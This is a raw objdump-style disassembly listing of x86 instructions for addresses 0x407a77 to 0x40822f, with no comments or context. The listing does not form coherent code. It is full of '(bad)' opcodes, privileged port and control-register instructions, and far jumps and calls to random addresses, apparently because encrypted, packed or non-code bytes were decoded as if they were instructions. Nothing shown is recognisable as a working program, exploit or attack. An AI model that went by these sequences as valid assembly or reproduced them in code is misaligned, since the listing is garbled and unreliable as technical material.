  407a77:	mov    BYTE PTR [edi-0x5e],bl
  407a7a:	pop    ecx
  407a7b:	fmul   DWORD PTR [ecx-0x5]
  407a7e:	ss stos BYTE PTR es:[edi],al
  407a80:	pusha  
  407a81:	mov    dh,0x10
  407a83:	or     ah,BYTE PTR [eax]
  407a85:	ud1    ebx,DWORD PTR [edx+eiz*2-0x3e]
  407a8a:	or     al,0x93
  407a8c:	cmp    BYTE PTR [ebx],cl
  407a8e:	mov    esi,DWORD PTR [ecx]
  407a90:	adc    eax,ebx
  407a92:	jecxz  0x407a30
  407a94:	inc    edx
  407a95:	pushf  
  407a96:	and    ah,BYTE PTR ds:0xbab57fb2
  407a9c:	in     eax,dx
  407a9d:	mov    ds,WORD PTR [ebp-0x505d5dad]
  407aa3:	jae    0x407a7e
  407aa5:	or     eax,0x3a23ce79
  407aaa:	mov    bh,0x22
  407aac:	sbb    BYTE PTR [ecx+0x1689f3bb],0x8d
  407ab3:	ss js  0x407b30
  407ab6:	inc    edi
  407ab7:	shl    BYTE PTR [eax+eiz*4],1
  407aba:	mov    ds:0xa1d874cb,eax
  407abf:	xor    al,0x9d
  407ac1:	scas   al,BYTE PTR es:[edi]
  407ac2:	mov    cl,0x7f
  407ac4:	in     al,dx
  407ac5:	lock dec edi
  407ac7:	and    bl,dl
  407ac9:	shl    DWORD PTR [bp+si],1
  407acc:	dec    ax
  407ace:	dec    ecx
  407acf:	repnz push eax
  407ad1:	loope  0x407b24
  407ad3:	sar    DWORD PTR [edx+0x3d89566f],0x5f
  407ada:	(bad)  [ebx]
  407adc:	and    edx,DWORD PTR [edi+edx*1-0x4bf82466]
  407ae3:	aam    0xf3
  407ae5:	aaa    
  407ae6:	mov    dl,0xdd
  407ae8:	push   esp
  407ae9:	frstor [eax+0x48]
  407aec:	jbe    0x407a92
  407aee:	jl     0x407ac2
  407af0:	lock pop ecx
  407af2:	data16 repnz fst DWORD PTR [edi+edi*2+0x1d]
  407af8:	ja     0x407a96
  407afa:	lods   eax,DWORD PTR ds:[esi]
  407afb:	xchg   BYTE PTR [eax+edx*2+0x7a],bh
  407aff:	jno    0x407ae6
  407b01:	jmp    0x37efe91a
  407b06:	push   ecx
  407b07:	pop    ds
  407b08:	dec    ebp
  407b09:	and    ah,ah
  407b0b:	mov    esp,0x8c1ac82c
  407b10:	fs scas al,BYTE PTR es:[edi]
  407b12:	int    0x80
  407b14:	push   esi
  407b15:	fs inc ebp
  407b17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b19:	imul   ebp,DWORD PTR [esi+0x77b36a9b],0xd589824d
  407b23:	mov    eax,ds:0xb5fea1ae
  407b28:	je     0x407b8f
  407b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b2b:	ror    BYTE PTR ds:0xbef7ec91,1
  407b31:	pop    edi
  407b32:	pushf  
  407b33:	or     dh,dh
  407b35:	mov    dl,0xa2
  407b37:	sbb    dl,BYTE PTR [ebx]
  407b39:	outs   dx,BYTE PTR es:[esi]
  407b3b:	push   edi
  407b3c:	cmp    BYTE PTR [esi+0x7d],ch
  407b3f:	push   ebp
  407b40:	or     dh,0x6f
  407b43:	fbstp  TBYTE PTR [ebx-0x49c45c23]
  407b49:	jbe    0x407b64
  407b4b:	dec    edx
  407b4c:	jnp    0x407b84
  407b4e:	and    DWORD PTR [ecx+edi*1-0x50c34df2],edi
  407b55:	inc    esi
  407b56:	mov    BYTE PTR [eax-0x52f960a7],bl
  407b5c:	in     al,dx
  407b5d:	sub    ebx,esp
  407b5f:	mov    ss,WORD PTR [esp+eax*2-0x64]
  407b63:	lods   al,BYTE PTR ds:[esi]
  407b64:	out    dx,eax
  407b65:	outs   dx,DWORD PTR ds:[esi]
  407b66:	inc    ebx
  407b67:	add    DWORD PTR [edi+0x2b45f650],edx
  407b6d:	bound  eax,QWORD PTR [edi]
  407b6f:	mov    esi,0x6ec9a9ee
  407b74:	fsubr  QWORD PTR [edx+0x390d8254]
  407b7a:	mov    dl,0x32
  407b7c:	push   ds
  407b7d:	inc    ebp
  407b7e:	mov    edi,DWORD PTR [eax-0x878efff]
  407b84:	arpl   WORD PTR [ecx-0x2b],cx
  407b87:	push   ds
  407b88:	js     0x407b23
  407b8a:	out    0x81,al
  407b8c:	and    eax,0x5ea62e4e
  407b91:	or     BYTE PTR [ecx],bl
  407b93:	xor    esp,ebx
  407b95:	gs jl  0x407b4b
  407b98:	xor    eax,0x2b16557c
  407b9d:	xor    DWORD PTR [esi+0xd960378],edi
  407ba3:	addr16 push cs
  407ba5:	inc    ecx
  407ba6:	jle    0x407bae
  407ba8:	aaa    
  407ba9:	cmc    
  407baa:	xor    ebp,0xff02b433
  407bb0:	sti    
  407bb1:	pusha  
  407bb2:	stc    
  407bb3:	xor    DWORD PTR [esi],0xfffffff5
  407bb6:	xchg   edx,eax
  407bb7:	in     eax,0x31
  407bb9:	adc    bl,BYTE PTR [ecx-0x16be28cd]
  407bbf:	sahf   
  407bc0:	sbb    al,BYTE PTR [ebp+0x4645b50e]
  407bc6:	and    DWORD PTR [edx],edx
  407bc8:	push   0xea9b5eaa
  407bcd:	paddw  mm3,QWORD PTR [edx+eiz*1+0x73e47593]
  407bd5:	test   eax,0x463d838d
  407bda:	sub    DWORD PTR [esi],edi
  407bdc:	lds    esp,FWORD PTR ds:0xeba6177b
  407be2:	repz retf 0x553c
  407be6:	inc    esp
  407be7:	fwait
  407be8:	sbb    dh,BYTE PTR [esi+eax*2+0x54]
  407bec:	imul   BYTE PTR [eax]
  407bee:	mov    ds:0xa02a16a3,al
  407bf3:	sub    eax,0x9b463aba
  407bf8:	push   ecx
  407bf9:	mov    BYTE PTR [ebp+0x44],al
  407bfc:	jg     0x407c7b
  407bfe:	dec    eax
  407bff:	pushf  
  407c00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c01:	ds mov ch,0x59
  407c04:	call   0x5f3:0xe7fa67bd
  407c0b:	repnz sbb BYTE PTR [esi+0x3e],ah
  407c0f:	imul   ecx,DWORD PTR [ebp-0x7e],0x3b
  407c13:	pop    esp
  407c14:	adc    eax,0xca7dcaa2
  407c19:	rcl    ebx,cl
  407c1b:	mov    al,0xf0
  407c1d:	push   ecx
  407c1e:	data16 adc al,0x97
  407c21:	mov    dl,0x1a
  407c23:	jge    0x407c80
  407c25:	in     eax,dx
  407c26:	jge    0x407ca5
  407c28:	pop    esi
  407c29:	xchg   DWORD PTR [edx+0x48],ebx
  407c2c:	or     BYTE PTR [eax],bh
  407c2e:	repnz inc esi
  407c30:	mov    ds:0xce62d484,eax
  407c35:	rcr    DWORD PTR [edi],0x44
  407c38:	add    BYTE PTR [esi+0x2fcf83b1],cl
  407c3e:	xchg   ecx,eax
  407c3f:	inc    eax
  407c40:	xchg   DWORD PTR [eax-0x53],esi
  407c43:	clc    
  407c44:	xchg   DWORD PTR [esi-0x20],esp
  407c47:	push   eax
  407c48:	and    al,0xe4
  407c4a:	retf   0x7413
  407c4d:	fisub  WORD PTR [bx+si]
  407c50:	xchg   ebp,eax
  407c51:	sbb    DWORD PTR [edi-0x50e2cae3],edi
  407c57:	sub    al,0xa9
  407c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c5a:	lahf   
  407c5b:	and    DWORD PTR [ecx],eax
  407c5d:	pop    edi
  407c5e:	imul   ebp,DWORD PTR [esi-0x414a15f5],0x2
  407c65:	cmp    ebp,ecx
  407c67:	adc    BYTE PTR [esi-0x11bb0201],cl
  407c6d:	add    ebp,DWORD PTR [ecx-0x69842b1a]
  407c73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c74:	scas   eax,DWORD PTR es:[edi]
  407c75:	or     al,0xee
  407c77:	sbb    eax,0x7a9f5f72
  407c7c:	je     0x407c6a
  407c7e:	call   0x2694:0x8eb7e4a6
  407c85:	jp     0x407cff
  407c87:	inc    edi
  407c88:	inc    esi
  407c89:	push   es
  407c8a:	dec    edx
  407c8b:	dec    eax
  407c8c:	push   esi
  407c8d:	(bad)  
  407c8e:	mov    esp,0xfa1efe80
  407c93:	loop   0x407c22
  407c95:	ret    0xe9af
  407c98:	scas   eax,DWORD PTR es:[edi]
  407c99:	icebp  
  407c9a:	dec    ebp
  407c9b:	es iret 
  407c9d:	enter  0x14f1,0x3d
  407ca1:	or     al,0x4f
  407ca3:	or     cl,BYTE PTR [eax-0x49]
  407ca6:	outs   dx,DWORD PTR ds:[esi]
  407ca7:	mov    ebp,0x782869da
  407cac:	rcr    DWORD PTR [edx-0x4e],cl
  407caf:	and    BYTE PTR [edi-0x4c],ah
  407cb2:	int3   
  407cb3:	pop    ds
  407cb4:	or     al,0x36
  407cb6:	lods   eax,DWORD PTR ds:[esi]
  407cb7:	je     0x407cc0
  407cb9:	cmp    esp,DWORD PTR ss:[bx+si]
  407cbd:	dec    esi
  407cbe:	dec    esi
  407cbf:	sahf   
  407cc0:	jl     0x407ce7
  407cc2:	mov    eax,ds:0x1febe2a4
  407cc7:	js     0x407d32
  407cc9:	hlt    
  407cca:	xlat   BYTE PTR ds:[ebx]
  407ccb:	jo     0x407cef
  407ccd:	js     0x407c66
  407ccf:	mov    ah,ch
  407cd1:	popa   
  407cd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cd3:	cwde   
  407cd4:	nop
  407cd5:	adc    DWORD PTR [ecx-0x35],esp
  407cd8:	add    bh,BYTE PTR ds:0x2a89054f
  407cde:	jo     0x407c98
  407ce0:	adc    dl,BYTE PTR [eax-0x52]
  407ce3:	mov    ah,0x3f
  407ce5:	js     0x407c6a
  407ce7:	xchg   edi,eax
  407ce8:	sub    ebx,DWORD PTR [esi+ebx*4+0x4f]
  407cec:	test   ebp,esp
  407cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cef:	iret   
  407cf0:	xor    al,0xc8
  407cf2:	popa   
  407cf3:	loope  0x407d71
  407cf5:	pop    eax
  407cf6:	mov    bl,0xe9
  407cf8:	push   ds
  407cf9:	push   ebp
  407cfa:	rcl    DWORD PTR [edi+0x3173cceb],1
  407d00:	mov    edi,0x5d1990fa
  407d05:	adc    al,0x6
  407d07:	lds    esi,FWORD PTR [ecx-0x16]
  407d0a:	dec    ecx
  407d0b:	call   ebp
  407d0d:	push   DWORD PTR [edx-0x6fe81cfd]
  407d13:	bound  ebp,QWORD PTR [edx+0x31eb1547]
  407d19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d1a:	jnp    0x407d09
  407d1c:	sti    
  407d1d:	push   esp
  407d1e:	mov    DWORD PTR [eax],ecx
  407d20:	xor    eax,0xca61a057
  407d25:	xchg   esp,eax
  407d26:	je     0x407d7f
  407d28:	jo     0x407cdf
  407d2a:	mul    BYTE PTR [edi]
  407d2c:	aas    
  407d2d:	push   ds
  407d2e:	jl     0x407d4f
  407d30:	shl    DWORD PTR [edi+0x1a9bf5b1],1
  407d36:	jle    0x407cc2
  407d38:	sbb    esi,DWORD PTR [ebx+ebp*2+0x12]
  407d3c:	(bad)  
  407d3d:	mov    edx,0xbf6ba532
  407d42:	ret    
  407d43:	ds or  al,0xbb
  407d46:	jmp    0x441f:0x9eeb910b
  407d4d:	pop    edi
  407d4e:	idiv   DWORD PTR [edx+0x63]
  407d51:	ret    
  407d52:	cmp    ch,ah
  407d54:	dec    eax
  407d55:	sub    esi,DWORD PTR [ecx-0x130e4e24]
  407d5b:	mov    dh,0xcd
  407d5d:	sub    ch,BYTE PTR [ecx+0x2d]
  407d60:	lods   al,BYTE PTR ds:[esi]
  407d61:	push   ecx
  407d62:	sbb    dl,BYTE PTR [edi+0x27dae6c7]
  407d68:	in     eax,dx
  407d69:	scas   eax,DWORD PTR es:[edi]
  407d6a:	ja     0x407d74
  407d6c:	sub    edi,DWORD PTR ds:0xe8f6a315
  407d72:	push   0x11
  407d74:	fdivr  st,st(3)
  407d76:	add    BYTE PTR [eax],0x1d
  407d79:	mov    ?,ecx
  407d7b:	mov    bl,0xf9
  407d7d:	addr16 mov ebp,0xf00e1ee4
  407d83:	loopne 0x407d4e
  407d85:	jns    0x407dbc
  407d87:	or     cl,dl
  407d89:	pop    esi
  407d8a:	stos   DWORD PTR es:[edi],eax
  407d8b:	das    
  407d8c:	pushf  
  407d8d:	add    al,0x4
  407d8f:	mov    esi,0x29ae28ec
  407d94:	(bad)  
  407d95:	push   ecx
  407d96:	stos   DWORD PTR es:[edi],eax
  407d97:	and    edx,DWORD PTR fs:[esi-0x5f]
  407d9b:	cs repz call 0x2950:0x661e7c2e
  407da4:	popf   
  407da5:	stos   BYTE PTR es:[edi],al
  407da6:	and    bh,BYTE PTR [edi-0x22]
  407da9:	test   eax,0x1e0164a3
  407dae:	cmp    ebp,DWORD PTR [ecx-0x2e]
  407db1:	call   0x8a391c5f
  407db6:	adc    BYTE PTR [ebx-0x67c20bbb],cl
  407dbc:	xor    BYTE PTR [ebx],dl
  407dbe:	pop    eax
  407dbf:	jmp    0x408135
  407dc4:	cwde   
  407dc5:	mov    eax,ds:0x5b4dbc42
  407dca:	mov    ds:0x4fdb206d,al
  407dcf:	or     cl,al
  407dd1:	ins    DWORD PTR es:[edi],dx
  407dd2:	popf   
  407dd3:	adc    al,BYTE PTR [eax-0x2883832f]
  407dd9:	jns    0x407e57
  407ddb:	jl     0x407e37
  407ddd:	push   cs
  407dde:	out    dx,eax
  407ddf:	mov    edi,0xffdba485
  407de4:	jb     0x407d90
  407de6:	shr    BYTE PTR [ebp-0x18],cl
  407de9:	hlt    
  407dea:	dec    ecx
  407deb:	pop    esp
  407dec:	sub    DWORD PTR [esi],edi
  407dee:	pavgb  mm1,QWORD PTR [edx+0x22]
  407df2:	and    esi,DWORD PTR [edi]
  407df4:	fdivr  DWORD PTR [ebx+0x7107b6dc]
  407dfa:	repnz out 0xd2,eax
  407dfd:	repz cdq 
  407dff:	lods   al,BYTE PTR ds:[esi]
  407e00:	mov    edx,0xac823b34
  407e05:	pop    esi
  407e06:	call   0x687:0x63f4f38c
  407e0d:	dec    BYTE PTR [eax]
  407e0f:	mov    esp,0x25f98cf4
  407e14:	icebp  
  407e15:	sahf   
  407e16:	or     dh,BYTE PTR [ecx-0x39]
  407e19:	or     ebx,DWORD PTR [ecx+0x1938bbbc]
  407e1f:	jp     0x407df1
  407e21:	ss js  0x407e65
  407e24:	xchg   ecx,eax
  407e25:	pushf  
  407e26:	mov    edi,cr6
  407e29:	jmp    0x70e2cf69
  407e2e:	ins    BYTE PTR es:[edi],dx
  407e2f:	cmp    ecx,DWORD PTR [ebx+0x1dd9f38d]
  407e35:	shl    BYTE PTR [ecx+0x63705b6f],cl
  407e3b:	cmp    DWORD PTR [eax-0xcca73d7],edi
  407e41:	push   esp
  407e42:	mov    cl,0x85
  407e44:	pop    edi
  407e45:	leave  
  407e46:	dec    edi
  407e47:	or     ah,0xfd
  407e4a:	xor    edx,DWORD PTR [edi]
  407e4c:	mov    esp,0x579f24a
  407e51:	xchg   edx,eax
  407e52:	push   0x1f21996f
  407e57:	in     al,dx
  407e58:	test   BYTE PTR [ecx+eiz*2],0xaf
  407e5c:	dec    esp
  407e5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e5e:	mov    eax,ds:0xb0a5b936
  407e63:	jae    0x407e76
  407e65:	mov    edx,0x38babd59
  407e6a:	stc    
  407e6b:	rcl    DWORD PTR [edi-0xc],1
  407e6e:	mov    ebx,0xfe78e9e7
  407e73:	push   ecx
  407e74:	aad    0xee
  407e76:	or     eax,0xe215a72f
  407e7b:	or     ecx,DWORD PTR [eax]
  407e7d:	loopne 0x407eaa
  407e7f:	loop   0x407ed7
  407e81:	and    al,0x95
  407e83:	push   0xffffffc4
  407e85:	pop    eax
  407e86:	scas   eax,DWORD PTR es:[edi]
  407e87:	mov    ebp,0xe945815a
  407e8c:	in     eax,0xee
  407e8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e8f:	mov    bl,0x8b
  407e91:	dec    edx
  407e92:	je     0x407ec7
  407e94:	xor    DWORD PTR ds:[ebx+0x25],edx
  407e98:	xor    dl,dh
  407e9a:	hlt    
  407e9b:	js     0x407ece
  407e9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e9e:	call   0x747f7fda
  407ea3:	push   edi
  407ea4:	xchg   ebx,eax
  407ea5:	adc    dh,bl
  407ea7:	mov    cl,BYTE PTR ds:0x74c350ac
  407ead:	lods   al,BYTE PTR ds:[esi]
  407eae:	lods   al,BYTE PTR ds:[esi]
  407eaf:	repnz and al,0x0
  407eb2:	adc    esp,DWORD PTR [edx-0x27]
  407eb5:	fisub  DWORD PTR [ebx+0x16]
  407eb8:	sbb    edi,DWORD PTR ds:0x91b06c35
  407ebe:	loop   0x407eb6
  407ec0:	jg     0x407f1f
  407ec2:	push   edx
  407ec3:	push   cs
  407ec4:	data16 cmp al,BYTE PTR [edx+0x47ee443d]
  407ecb:	adc    BYTE PTR [eax+0x6f],al
  407ece:	jnp    0x407e93
  407ed0:	ss adc esp,edi
  407ed3:	xchg   esp,eax
  407ed4:	shl    BYTE PTR [ebp+ebx*1+0x56],cl
  407ed8:	mov    ebp,0x67253bb5
  407edd:	xchg   esp,eax
  407ede:	xlat   BYTE PTR ds:[ebx]
  407edf:	dec    edx
  407ee0:	or     ecx,DWORD PTR [eax+0x6cd10330]
  407ee6:	in     eax,0x1d
  407ee8:	ficomp DWORD PTR fs:[ecx+0xf07817b]
  407eef:	mov    ebx,0x7f1505ee
  407ef4:	icebp  
  407ef5:	jl     0x407e97
  407ef7:	aaa    
  407ef8:	mov    BYTE PTR [esi-0x15],bh
  407efb:	lea    ebx,[esi]
  407efd:	jae    0x407ebf
  407eff:	push   esp
  407f00:	int    0xc5
  407f02:	lock test al,0xed
  407f05:	rol    DWORD PTR [edi-0x38746819],0x57
  407f0c:	cmp    al,0x2c
  407f0e:	mov    DWORD PTR [ecx+ecx*1],esp
  407f11:	add    al,0xbd
  407f13:	sbb    eax,0x32e8691f
  407f18:	lahf   
  407f19:	xor    DWORD PTR [ebx+0x3],ebx
  407f1c:	fidiv  WORD PTR [ecx+0x3d]
  407f1f:	inc    esi
  407f20:	cmc    
  407f21:	outs   dx,DWORD PTR ds:[esi]
  407f22:	push   edx
  407f23:	out    0x3e,eax
  407f25:	mov    edx,0x72c3d20c
  407f2a:	(bad)  
  407f2b:	xchg   edi,eax
  407f2c:	mov    ch,0x83
  407f2e:	call   0x5dc634c
  407f33:	cmp    ah,BYTE PTR [esi]
  407f35:	gs jge 0x407f5e
  407f38:	data16 jmp 0x407f59
  407f3b:	jg     0x407ec2
  407f3d:	cmp    al,bh
  407f3f:	inc    eax
  407f40:	jo     0x407f7e
  407f42:	ret    0x2e24
  407f45:	repnz inc esi
  407f47:	les    ebx,FWORD PTR [esp+eax*8-0x4e6ebb2b]
  407f4e:	jno    0x407f59
  407f50:	bound  esp,QWORD PTR [ebp+0x5b6ca9c7]
  407f56:	test   eax,0xcf54b3f0
  407f5b:	inc    ebx
  407f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f5e:	sar    DWORD PTR [eax+0x37],cl
  407f61:	jl     0x407f9c
  407f63:	shl    BYTE PTR [esi],0x9c
  407f66:	cdq    
  407f67:	repnz or ebp,edx
  407f6a:	cli    
  407f6b:	shl    BYTE PTR [ebx-0x3a],cl
  407f6e:	stc    
  407f6f:	test   al,0xcd
  407f71:	push   ebp
  407f73:	add    esi,DWORD PTR ds:0xa16ea6a1
  407f79:	imul   esi,DWORD PTR [eax],0x69b279d
  407f7f:	add    eax,0xc50c81d
  407f84:	nop
  407f85:	in     al,0xb3
  407f87:	dec    esi
  407f88:	fisub  DWORD PTR [ecx+0x75]
  407f8b:	setae  BYTE PTR [eax+esi*8]
  407f8f:	jb     0x407fb0
  407f91:	dec    ebx
  407f92:	pop    edi
  407f93:	jmp    0xd75c8603
  407f98:	(bad)  
  407f99:	retf   0xb134
  407f9c:	inc    edx
  407f9d:	cmp    bl,dh
  407f9f:	fidiv  DWORD PTR [ecx+0x7d4750bf]
  407fa5:	(bad)  
  407fa6:	hlt    
  407fa7:	test   eax,0x8706aaaa
  407fac:	xchg   edx,eax
  407fad:	pop    ds
  407fae:	add    ebp,DWORD PTR [esi-0x3f]
  407fb1:	sbb    DWORD PTR [edx],0xffffffde
  407fb4:	dec    edx
  407fb5:	xchg   edi,eax
  407fb6:	adc    BYTE PTR [ebx-0x766322fc],al
  407fbc:	pushf  
  407fbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fbe:	lds    esp,FWORD PTR [eax-0x4099bfb1]
  407fc4:	mov    ds:0x2ce1add9,eax
  407fc9:	(bad)  
  407fca:	fbld   TBYTE PTR [ebx+ebx*4]
  407fcd:	outs   dx,DWORD PTR ds:[esi]
  407fce:	inc    ebx
  407fcf:	std    
  407fd0:	test   al,0xb7
  407fd2:	lods   eax,DWORD PTR ds:[esi]
  407fd3:	cmp    eax,DWORD PTR [esi+ebx*2-0x41b46267]
  407fda:	pop    ecx
  407fdb:	popa   
  407fdc:	jns    0x407fe2
  407fde:	or     ebx,ebx
  407fe0:	or     al,0x8f
  407fe2:	inc    ecx
  407fe3:	mov    edi,0x37d5e96b
  407fe8:	loopne 0x407ff8
  407fea:	js     0x40804c
  407fec:	and    al,0x3d
  407fee:	rcl    DWORD PTR [edx],0x24
  407ff1:	dec    ecx
  407ff2:	rcr    BYTE PTR [ebp-0x13],0xde
  407ff6:	xchg   esi,eax
  407ff7:	cmc    
  407ff8:	mov    bh,BYTE PTR [edi]
  407ffa:	sbb    BYTE PTR [edi],0xc0
  407ffd:	iret   
  407ffe:	mov    ah,ch
  408000:	pop    es
  408001:	xchg   BYTE PTR ds:0x9a92183f,dl
  408007:	adc    BYTE PTR [esi+0x6ec52879],cl
  40800d:	stos   BYTE PTR es:[edi],al
  40800e:	pop    eax
  40800f:	and    DWORD PTR [eax-0x512aac42],esp
  408015:	je     0x407fe6
  408017:	(bad)  
  408018:	fldenv [esi+0x27b9318b]
  40801e:	inc    esi
  40801f:	(bad)  
  408020:	ins    DWORD PTR es:[edi],dx
  408021:	test   BYTE PTR [ebp-0x7990253a],dl
  408027:	sahf   
  408028:	lds    edi,FWORD PTR [edx-0x1d]
  40802b:	hlt    
  40802c:	jmp    0x4503:0x228811f5
  408033:	aas    
  408034:	sub    esi,DWORD PTR [ecx]
  408036:	or     al,0x6e
  408038:	repz cmp dh,BYTE PTR [esi]
  40803b:	lea    eax,[ecx-0x5e]
  40803e:	mov    gs,WORD PTR [ebx+0x5b]
  408041:	or     edi,DWORD PTR [ebp+ecx*2+0x80b171a]
  408048:	add    DWORD PTR [edi-0x6ee96de0],ecx
  40804e:	cmp    eax,0xe86bde7f
  408053:	xchg   esi,eax
  408054:	stc    
  408055:	adc    al,0xeb
  408057:	or     edi,eax
  408059:	adc    DWORD PTR [edx],0x7c647ead
  40805f:	adc    eax,0x7289c7fe
  408064:	ret    
  408065:	das    
  408066:	fld    TBYTE PTR [ebp+0x3c6cbf24]
  40806c:	sub    ebx,DWORD PTR [edx-0x4e]
  40806f:	dec    ebx
  408070:	test   al,0x49
  408072:	shr    cl,1
  408074:	pop    ebx
  408075:	call   0x11f58f15
  40807a:	fisub  WORD PTR [edi+edx*2]
  40807d:	call   0x158b337c
  408082:	(bad)  
  408083:	push   esp
  408084:	fcmovne st,st(2)
  408086:	pop    esp
  408087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408088:	fiadd  DWORD PTR [eax]
  40808a:	mov    eax,0xde4d9586
  40808f:	mov    eax,ds:0x93df044e
  408094:	xlat   BYTE PTR ds:[ebx]
  408095:	cmc    
  408096:	(bad)  
  408097:	fild   WORD PTR [ebx-0x53644860]
  40809d:	arpl   WORD PTR [ebp-0x20],dx
  4080a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080a1:	pop    ebp
  4080a2:	in     eax,dx
  4080a3:	cbw    
  4080a5:	xchg   edx,eax
  4080a6:	mov    ch,0x5e
  4080a8:	pushf  
  4080a9:	or     al,0xa8
  4080ab:	and    al,0x15
  4080ad:	xchg   esi,eax
  4080ae:	repz fadd st,st(6)
  4080b1:	jecxz  0x40806a
  4080b3:	add    al,0x27
  4080b5:	test   DWORD PTR [ebx+0x4851e2a],ebp
  4080bb:	mov    ebx,0x46da29d0
  4080c0:	outs   dx,BYTE PTR ds:[esi]
  4080c1:	push   ss
  4080c2:	add    DWORD PTR [eax],0x13
  4080c5:	xchg   ebp,eax
  4080c6:	ret    0x76fb
  4080c9:	pop    ebx
  4080ca:	js     0x4080b6
  4080cc:	int    0xb7
  4080ce:	mov    ch,0xd
  4080d0:	xor    dl,ch
  4080d2:	lds    eax,FWORD PTR [eax+eiz*8-0x5f82171c]
  4080d9:	jbe    0x408136
  4080db:	xchg   edx,eax
  4080dc:	idiv   DWORD PTR [esi]
  4080de:	jno    0x408070
  4080e0:	cmp    eax,0x60b02b5c
  4080e5:	inc    eax
  4080e6:	out    0xee,eax
  4080e8:	retf   0xa152
  4080eb:	shr    DWORD PTR [ebp-0x77],0xa7
  4080ef:	or     DWORD PTR [edi+esi*1+0x13],0x29c5f0e0
  4080f7:	jbe    0x4080f6
  4080f9:	shl    BYTE PTR [esi-0x33],cl
  4080fc:	cmp    DWORD PTR [esp+eiz*4+0xb],eax
  408100:	add    ebx,DWORD PTR es:[eax-0x71dde72d]
  408107:	adc    ch,ch
  408109:	mov    dl,0x61
  40810b:	in     al,dx
  40810c:	retf   0x3d01
  40810f:	pop    ds
  408110:	xchg   BYTE PTR [ebp+0x2a],dl
  408113:	xlat   BYTE PTR ds:[ebx]
  408114:	retf   0xa18f
  408117:	jbe    0x4080e0
  408119:	fisttp WORD PTR [esi-0x304ea6b6]
  40811f:	pop    esi
  408120:	int    0x2e
  408122:	int    0x53
  408124:	(bad)  
  408125:	xchg   ebx,eax
  408126:	icebp  
  408127:	cmp    eax,0x5ca855d3
  40812c:	in     eax,dx
  40812d:	fwait
  40812e:	sub    BYTE PTR [eax+esi*2-0x66a788c9],bh
  408135:	je     0x4084c8
  40813b:	mov    eax,DWORD PTR [ebp-0x1c]
  40813e:	or     DWORD PTR [eax],0x60751c98
  408144:	jmp    0x4084ba
  408149:	pop    edx
  40814a:	jns    0x4080ea
  40814c:	fs bound ecx,QWORD PTR gs:[di]
  408151:	add    ebp,ebp
  408153:	push   ebx
  408154:	sbb    ecx,DWORD PTR [edi]
  408156:	dec    edi
  408157:	jae    0x408150
  408159:	pop    ebx
  40815a:	sar    BYTE PTR [esp+edi*2-0x29],cl
  40815e:	jns    0x4081dc
  408160:	jl     0x408167
  408162:	rcl    DWORD PTR ds:0x4a0fb357,0xbf
  408169:	ror    BYTE PTR [eax+0xa9c0810],cl
  40816f:	mov    eax,0x7d60c22e
  408174:	xor    DWORD PTR [esi+ebx*2],0xffffffd8
  408178:	or     edi,DWORD PTR [esi-0x58]
  40817b:	loope  0x408100
  40817d:	data16 ficom WORD PTR ds:0xb3be747a
  408184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408185:	adc    eax,0xa8bb7386
  40818a:	push   es
  40818b:	add    al,0xf9
  40818d:	add    al,0x8
  40818f:	ds dec ebx
  408191:	sub    DWORD PTR [edx+0x18],esi
  408194:	mov    dh,0x8b
  408196:	bound  ebp,QWORD PTR [eax+edi*4+0x5da2de90]
  40819d:	imul   edi,ebp,0x346958b7
  4081a3:	xchg   esp,eax
  4081a4:	outs   dx,DWORD PTR ds:[esi]
  4081a5:	push   ebp
  4081a6:	call   0xbe78fa9a
  4081ab:	out    0x60,eax
  4081ad:	lods   al,BYTE PTR ds:[esi]
  4081ae:	cwde   
  4081af:	(bad)  [bx+0x24ed]
  4081b4:	push   es
  4081b5:	aam    0x6f
  4081b7:	xor    DWORD PTR [edi-0x2a69d728],0xffffffec
  4081be:	dec    ebp
  4081bf:	sbb    DWORD PTR [esi-0x1378f210],0x7d
  4081c6:	outs   dx,BYTE PTR ds:[esi]
  4081c7:	ja     0x40821e
  4081c9:	inc    esi
  4081ca:	je     0x4081ce
  4081cc:	mov    tr5,eax
  4081cf:	rol    BYTE PTR [eax+0x6b],cl
  4081d2:	dec    edi
  4081d3:	(bad)  
  4081d4:	in     al,dx
  4081d5:	test   eax,0xe3fa953d
  4081da:	mov    dl,0x1a
  4081dc:	mov    BYTE PTR [edx-0x740b963c],0x8c
  4081e3:	lea    ebx,[ebp-0x584104a9]
  4081e9:	sbb    DWORD PTR [ecx],ecx
  4081eb:	xor    ecx,DWORD PTR [ebx+0x28]
  4081ee:	adc    BYTE PTR [esi-0x823a3fe],0x4f
  4081f5:	mov    ch,0x35
  4081f7:	or     esp,DWORD PTR [esp+esi*8]
  4081fa:	test   al,0xd2
  4081fc:	jle    0x40824c
  4081fe:	inc    esp
  4081ff:	jmp    0xd17c:0xdbe6ab1e
  408206:	sbb    BYTE PTR ds:0x832f5350,0x68
  40820d:	jbe    0x4081e8
  40820f:	xor    BYTE PTR [edi+0x473f5bc5],0x7a
  408216:	cdq    
  408217:	xchg   DWORD PTR [ebx],edx
  408219:	pop    eax
  40821a:	pop    ds
  40821b:	data16 and dh,BYTE PTR [ecx+0x58]
  40821f:	movsx  eax,WORD PTR [ebx]
  408222:	bound  esi,QWORD PTR [eax+edx*1+0x2eff6267]
  408229:	inc    ebp
  40822a:	jg     0x4082a3
  40822c:	push   eax
  40822d:	xor    bh,cl
  40822f:	clc    
